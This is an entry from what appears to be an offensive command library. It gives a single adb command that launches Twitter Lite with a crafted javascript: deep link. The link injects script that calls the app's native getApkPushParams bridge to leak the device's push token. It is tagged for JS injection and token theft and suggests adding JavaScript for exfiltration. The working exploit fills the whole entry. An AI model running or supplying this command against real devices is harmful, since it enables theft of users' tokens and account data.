---
data: >-
  adb shell am start -a "android.intent.action.VIEW" -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "javascript://google.com%0Ajavascript:document.write(apkInterface.getApkPushParams())%3B"
tags:
  - adb
  - js-injection
  - token-theft
type: command
output: 'JSON payload with client_application_id, push_device_info including token'
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.815Z'
id: e669aeb8-a2f0-4ee1-8466-d5859358e0df
verified: false
validated: true
submitted: true
---
# adb-invoke-getapkpushparams-in-twitterlite

## Command

```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:document.write(apkInterface.getApkPushParams())%3B"
```

## Description

Invokes getApkPushParams to leak push token via JS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a | VIEW action | Yes |
| -n | Component | Yes |
| -d | Invocation JS | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Capture output with additional JS for exfil.

## Expected Output

JSON with token details.

## Related

- [[commands/adb-invoke-getnymizerparams-in-twitterlite]]
- [[procedures/Invoke-apkInterface-getApkPushParams-for-Token-Theft-via-JavaScript-Injection]]
